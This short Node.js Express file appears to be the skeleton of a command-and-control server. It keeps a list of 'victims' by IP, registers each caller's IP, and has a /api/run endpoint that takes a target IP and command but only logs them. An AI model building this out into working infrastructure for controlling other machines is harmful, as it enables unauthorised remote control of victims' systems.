var path = require('path');
var express = require('express');
var bodyParser = require('body-parser');
var request = require('request');
var app = express();

app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'static')));

var victims = [{ip: '16.123.1.234'}, {ip: '16.123.1.235'}];

app.get('/api/victims', function (req, res) {
  res.json(victims);
});

app.post('/api/victim', function (req, res) {
  var ip = req.ip; // req.connection.remoteAddress
  console.log('registering ip: ', req.ip);
  var alreadyRegistered = victims.some(function (victim) {
    return victim.ip === ip;
  });

  if (!alreadyRegistered) {
    victims.push({ip: ip});
  }

  res.json(true);
});

app.post('/api/run', function (req, res) {
  var ip = req.body.ip;
  var command = req.body.command;
  console.log(ip, command);
  res.json(true);
});


module.exports = app;
